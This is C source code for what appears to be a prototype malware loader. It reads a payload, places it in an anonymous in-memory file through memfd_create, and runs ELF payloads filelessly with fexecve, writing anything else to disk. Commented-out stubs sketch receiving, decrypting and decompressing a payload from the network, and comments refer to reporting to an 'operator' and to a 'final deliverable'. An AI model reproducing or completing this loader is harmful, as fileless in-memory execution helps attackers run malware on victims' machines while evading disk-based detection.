#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include "detect.h"

//#include <decompress.h>
//#include <decrypt.h>
//#include <execute.h>
//#include <networking.h>

#define PAYLOAD_FILE "../test_files/test_static" // payload file to open, delete on final version


/*
    Get size in bytes of given file
*/
int fsize(FILE *fp){
    int prev=ftell(fp);
    fseek(fp, 0L, SEEK_END);
    int sz=ftell(fp);
    fseek(fp,prev,SEEK_SET); //go back to where we were
    return sz;
}

/*
    Execute paylaod in memory.
    Return 1 on success, 0 on failure.
*/
int executePayload(int payload_fd, char **payload_argv, char **payload_envp){
    if (fexecve(payload_fd, (char * const *) payload_argv, (char * const *) payload_envp) == -1){ // execute payload
        puts("fexecve() failed");
        return 0;
    }
    return 1;
}

/*
    Simply write payload to given file name
*/ 
void write_to_disk(void *payload, char *pathToWrite, int size){
    FILE *outfile = fopen(pathToWrite, "w");
    fwrite(payload, sizeof(char), size, outfile);
    fclose(outfile);
}

int main(int argc, char **argv){
    void *payload;
    void *decrypted;
    void *decompressed;
    FILE *payloadFile; // to hold payload file pointer, remove in final deliverable
    int size; // to hold file size, remove in final deliverable
    int payloadFD; // in memory file descriptor
    int writeReturnSize;
    int d; //to hold the return value of detect()
    char * payload_argv[] = {"../test_files/test_ELF", "testing", NULL}; // argv for payload
    char * payload_envp[] = {NULL}; // envp for payload
    char *pathToWrite = "../test_files/test_static_copy";
     
/*
    while(receive(payload) != 0){
        puts("BAD SHIT YO");
        sleep(1);
    }

    decrypt(payload, decrypted);
    decompress(decrypted, decompressed);
    execute(decrypted);
*/
    
    payloadFile = fopen(PAYLOAD_FILE, "r"); // open payload binary
    size = fsize(payloadFile); // get size in bytes
    payload = calloc(size, sizeof(unsigned char)); // allocate on heap
    fread(payload, sizeof(unsigned char), size, payloadFile); // read file to heap
    fclose(payloadFile); //close file


    while ((payloadFD = memfd_create("payload", 0)) <= 2){ // create memory file descriptor for execution
        printf("memfd_create() failed. File descriptor created: %d\n", payloadFD);
        close(payloadFD);
        return -1;
    }
    // read_payload(payload_fd); // read payload file over network into payload's file descriptor

    writeReturnSize = write(payloadFD, payload, size);  // write to mem_fd and error check
    if (writeReturnSize != size){
        printf("Writing to mem_fd failed. %d bytes written when %d bytes were supposed to be written.\n", writeReturnSize, size);
        return -1;
    }

    d = detect((unsigned char *)payload); //determine if the payload is an executable/ELF

    if (d == 1){
        if (executePayload(payloadFD, payload_argv, payload_envp) == 0){
            //send message to operator
            return -1;
        } 
    } else {
        write_to_disk(payload, pathToWrite, size);
    }

    return 0;
}